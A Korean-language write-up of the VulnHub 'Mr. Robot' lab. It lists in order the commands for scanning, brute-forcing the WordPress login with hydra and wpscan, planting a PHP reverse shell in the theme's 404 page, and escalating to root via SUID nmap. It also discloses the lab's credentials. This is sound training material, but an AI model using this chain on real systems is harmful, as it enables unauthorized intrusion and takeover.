[mr.robot](https://www.vulnhub.com/entry/mr-robot-1,151/)

# targetdiscovery
***
### nmap -sn 192.168.25.8-255 --open
![1](https://user-images.githubusercontent.com/69203345/111752692-5cbb6d80-88d9-11eb-907c-a746f132d86e.PNG)

# enumerate + exploitation
***
## target: 192.168.25.22
### nmap -O -sV -sS -p- 192.168.25.22
![2](https://user-images.githubusercontent.com/69203345/111753221-f4b95700-88d9-11eb-90b7-a4e48fbdf475.PNG)
#### nikto 192.168.25.22
![3](https://user-images.githubusercontent.com/69203345/111753310-10bcf880-88da-11eb-8a3f-2ec31d01dc0a.PNG)      
wordpress 사이트 발견     

### curl -v ://192.168.25.22/robots.txt
![4](https://user-images.githubusercontent.com/69203345/111753947-c8520a80-88da-11eb-8a84-330cd2ab32a8.PNG)

### curl -v ://192.168.25.22/key-1-of-3.txt
![5](https://user-images.githubusercontent.com/69203345/111755819-ddc83400-88dc-11eb-9bcb-78b8a8906f27.PNG)

### wget ://192.168.25.22/fsocity.dic
![6](https://user-images.githubusercontent.com/69203345/111754266-241c9380-88db-11eb-80f9-cd3a4072c49a.PNG)       
cat fsocity.dic | sort | uniq > fsocity2.dic    
burf suite 에서 사용자 이름 및 비밀번호 필드 가 각각 log pwd 확인      
![7](https://user-images.githubusercontent.com/69203345/111772705-82a03c80-88f0-11eb-9e56-22584eb6749a.PNG)
### hydra -L fsocity2.dic -p test 192.168.25.22 http-post-form "/wp-login.php : log=^USER^&pwd=^PWD^: Invalid username"
![8](https://user-images.githubusercontent.com/69203345/111895097-8dbfad80-8a53-11eb-92eb-631f61eaf834.PNG)

### hydra -l Elliot -P fsocity.dic 192.168.25.22 http-post-form "/wp-login.php : log=^USER^&pwd=^PWD^: The password you entered for the username"
![9](https://user-images.githubusercontent.com/69203345/111895085-71237580-8a53-11eb-8a30-5cb6ec52c80a.PNG)       
아무것도 안나옴...      
### wpscan --url 192.168.25.22 --usernames Elliot --passwords fsocity2.dic
![10](https://user-images.githubusercontent.com/69203345/111895224-85b43d80-8a54-11eb-974d-ff1c311155a8.PNG)     
ER28-0652 발견      
![11](https://user-images.githubusercontent.com/69203345/111895293-f196a600-8a54-11eb-983e-bb286e62c18a.PNG)        
로그인 성공     
Appearance > Editor > 404     
#### locate php-reverse-shell 
![12](https://user-images.githubusercontent.com/69203345/111895343-38849b80-8a55-11eb-847a-93cd277fb5a9.PNG)       
cat 로 /usr/share/webshells/php/php-reverse-shell.php 읽은뒤 복사 후 붙여넣기         
임의의 페이지 이동 하면 쉘 획득 한거 볼수 있음 난 192.168.25.22/404 로 이동함             
![13](https://user-images.githubusercontent.com/69203345/111895501-5c94ac80-8a56-11eb-93b4-d054559633ba.PNG)      

# privilege escalation 
***   
![14](https://user-images.githubusercontent.com/69203345/111895550-c745e800-8a56-11eb-863c-a97319094ac4.PNG)      
key는 못읽었지만 md5는 읽음     
복호화 abcdefghijklmnopqrstuvwxyz      
#### su - robot 로그인
![15](https://user-images.githubusercontent.com/69203345/111895756-00cb2300-8a58-11eb-8242-ec02aebcb487.PNG)
### find / -user root -perm -4000 2> /dev/null
![16](https://user-images.githubusercontent.com/69203345/111895802-599abb80-8a58-11eb-97b8-4b9b25e42d28.PNG)
### nmap --interactive
![17](https://user-images.githubusercontent.com/69203345/111895860-d7f75d80-8a58-11eb-97e1-b52d0b12d887.PNG)        
![18](https://user-images.githubusercontent.com/69203345/111895905-2278da00-8a59-11eb-82e6-d2e12afa139c.PNG)        


ㄲ-ㅌ

root획득   
꼭 이방법만 있는것은 아니다.
으악.
***
https://gist.github.com/dergachev/7916152#why-you-cant-un-root-a-compromised-machine        
-p	privileged	스크립트를 "suid"로 돌게함 (bash -p )        

